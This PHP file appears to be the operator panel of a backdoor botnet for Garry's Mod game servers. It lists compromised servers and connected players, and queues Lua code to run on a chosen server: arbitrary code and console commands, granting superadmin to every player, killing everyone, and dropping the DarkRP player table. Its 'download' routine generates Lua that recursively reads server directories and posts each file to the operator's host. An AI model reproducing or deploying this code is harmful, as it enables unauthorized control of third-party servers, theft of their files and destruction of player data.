<?php
require_once('common.php');
checkUser();
if($_GET["run"]=="list"){
echo '<title>Exec</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<br><center>
<style type="text/css">.color{background-color:#ccc;font:16px verdana,arial,helvetica,sans-serif;color:#fff;font-weight:700}.block1{float:left;position:relative;top:10px;left:40.5%}.block2{float:right;position:relative;top:10px;left:-70.5%}</style>
<p class="font-weight-normal"><a href="index.php">SERVERLIST</a>/<a href="runonserver.php?run=list&&ip='.$_GET["ip"].'">'.$_GET["ip"].'</a></p>
<div class="block1">
<p class="font-weight-normal">Clients:</p>
</style>
<table border="1" cellpadding="5" cellspacing="0" width="600">
<tr>
<th width="60%" class="color">SteamID64</th>
<th width="20%" class="color">Screenshot</th>
<th width="20%" class="color">Run</th>
</tr>';
foreach (glob("other/servers/".$_GET['ip']) as $filename) {
$tmp=explode('`',file_get_contents($filename));
foreach (json_decode($tmp[5]) as $filename1) {
echo "<tr>
<td><a target='_blank' href='https://steamcommunity.com/profiles/".$filename1."'>".$filename1."</a></td>
<td><a target='_blank' href='runonclient.php?run=screenshot&steamid=".$filename1."'>get</a></td>
<td><a href='runonclient.php?run=functions&ip=".$_GET["ip"]."&steamid=".$filename1."'>set</a></td>
</tr>";
}
}
echo '</table>
</div>
<div class="block2">
<p class="font-weight-normal">Server:</p>
<div class="card" style="width: 250; height: 300;"><br>
<p class="font-weight-normal"><a href="runonserver.php?run=int&ip='.$_GET["ip"].'">Run my code</a></p>
<p class="font-weight-normal"><a href="runonserver.php?run=runcommand&ip='.$_GET["ip"].'">Run my rcon command</a></p>
<p class="font-weight-normal"><a href="runonserver.php?run=givesuperadmineveryone&ip='.$_GET["ip"].'">Get Super admin everyone</a></p>
<p class="font-weight-normal"><a href="runonserver.php?run=killeveryone&ip='.$_GET["ip"].'">Kill everyone</a></p>
<p class="font-weight-normal"><a href="runonserver.php?run=crashdarkrpbase&ip='.$_GET["ip"].'">Crash DarkRP base</a></p>
<p class="font-weight-normal"><a href="runonserver.php?run=download&ip='.$_GET["ip"].'">Download server</a></p>
</div>
</div>';
}
if($_GET["run"]=="int"){
echo '<title>Exec</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<center><br>
<p class="font-weight-normal"><a href="index.php">SERVERLIST</a>/<a href="runonserver.php?run=list&&ip='.$_GET["ip"].'">'.$_GET["ip"].'</a>/<a href="runonserver.php?run=int&&ip='.$_GET["ip"].'">RUN CODE</a></p>
<form action="runonserver.php?run=code&&ip='.$_GET["ip"].'" method="post">
<input type="hidden" name="type" value="runcode">
<br>
<textarea style="width:500px; height:250px;" type="text" rows="10" cols="45" name="code" placeholder="Code"></textarea>
<br>
<br>
<input style="width:500px;" type="submit" name="submitBtn" value="run">
</form>';	
}
if($_GET["run"]=="code"){
file_put_contents("other/code/".$_GET["ip"],$_POST["code"]);
header('Location:runonserver.php?run=list&ip='.$_GET['ip']);
}
if($_GET["run"]=="runcommand"){
echo '<title>Exec</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<center><br>
<p class="font-weight-normal"><a href="index.php">SERVERLIST</a>/<a href="runonserver.php?run=list&&ip='.$_GET["ip"].'">'.$_GET["ip"].'</a>/<a href="runonserver.php?run=runcommand&&ip='.$_GET["ip"].'">RUN COMMAND</a></p>
<form action="runonserver.php?run=runcommandset&&ip='.$_GET["ip"].'" method="post">
<input type="hidden" name="type" value="runcode">
<br>
<input style="width:400px;" type="text" name="command" placeholder="Command">
<br>
<br>
<input style="width:400px;" type="submit" name="submitBtn" value="run">
</form>';	
}
if($_GET["run"]=="runcommandset"){
file_put_contents("other/code/".$_GET["ip"],'game.ConsoleCommand("'.$_POST["command"].'\n")');
header('Location:runonserver.php?run=list&ip='.$_GET['ip']);
}
if($_GET["run"]=="download"){
$sekrettvoieimamki=rand(100000000000000,1000000000000000);
file_put_contents("other/download/secretkey_".$_GET["ip"].".txt",$sekrettvoieimamki);
file_put_contents("other/code/".$_GET["ip"],'
local function a(b)
local c,d=file.Find(b.."*","MOD")
for _,f in pairs(c)do 
local g=file.Read(b.."/"..f,"GAME")
if g==nil then return end
http.Post("'.$directoria.'/download.php",{key="'.$sekrettvoieimamki.'",one=b,two=f,tree=g,ip=game.GetIPAddress()})
end
for h,i in pairs(d)do 
a(b..i.."/")
end 
end
a("lua/")
a("cfg/")
a("data/")
a("addons/")
a("gamemodes/")
');
echo '
<title>Exec</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<br>
<center>
<p class="font-weight-normal">Wait a minute and click on this link.</p>
<p class="font-weight-normal"><a href="other/download/'.$_GET['ip'].'.zip">download</a></p>';	
}
if($_GET["run"]=="givesuperadmineveryone"){
file_put_contents("other/code/".$_GET["ip"],'for k,v in pairs(player.GetAll()) do RunConsoleCommand("ulx","adduser",v:Nick(),"superadmin") end');
header('Location:runonserver.php?run=list&ip='.$_GET['ip']);
}
if($_GET["run"]=="killeveryone"){
file_put_contents("other/code/".$_GET["ip"],'for k,v in pairs(player.GetAll()) do v:Kill() end');
header('Location:runonserver.php?run=list&ip='.$_GET['ip']);
}
if($_GET["run"]=="crashdarkrpbase"){
file_put_contents("other/code/".$_GET["ip"],'sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")');
header('Location:runonserver.php?run=list&ip='.$_GET['ip']);
}
?>

